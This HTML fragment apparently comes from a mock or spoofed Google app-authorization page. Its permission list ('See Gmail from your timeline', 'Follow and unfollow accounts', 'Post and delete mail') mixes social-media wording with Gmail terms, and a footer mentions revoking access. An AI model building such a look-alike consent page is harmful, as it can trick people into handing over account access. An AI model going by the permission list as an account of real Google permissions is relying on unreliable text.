    ...
    <div class="custom-container">
        <div class="box">
            ...
            <div class="unorder-list">
                <ul>
                    <li>
                        See Gmail from your timeline (including protected Mail)
                        as well as your Lists and collections.
                    </li>
                    <li>
                        See your Gmail profile information and account settings.
                        See accounts you follow, mute, and block.
                    </li>
                    <li>Follow and unfollow accounts for you</li>
                    <li>Update your profile and account settings.</li>
                    <li>
                        Post and delete mail for you, and engage with mail
        ...
        <div class="custom-containerr">
            <div class="footer-text">
                <p class="big-text">
                    ...
                    understand how it will use data from your google account.
                    You can revoke access to any app at any time from the <span
                        >Apps and sessions</span
                    > section of your google account settings.
                </p>
            </div>
        </div>
    </footer>
